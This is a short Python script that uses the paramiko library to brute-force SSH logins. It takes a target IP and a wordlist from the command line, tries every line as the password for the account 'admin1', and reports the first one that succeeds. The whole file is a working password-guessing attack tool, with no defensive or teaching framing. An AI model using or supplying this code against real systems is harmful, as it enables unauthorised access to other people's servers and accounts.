import os
import sys
import paramiko

ip_addr = sys.argv[1]
file_name = sys.argv[2]
counter = 1

with open(f"{file_name}", "r") as wordlist:
    for line in wordlist:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"Probing password on line {counter}")
        counter += 1
        try:
            client.connect(hostname=f"{ip_addr}", username="admin1", password=f"{line.strip()}")
            print(f"Succesful connection with password {line}")
            break
        except paramiko.AuthenticationException:
            print("Wrong Credentials")
        except Exception as e:
            print(f"Conncetion failed: {e}")
        finally:
            client.close()
      
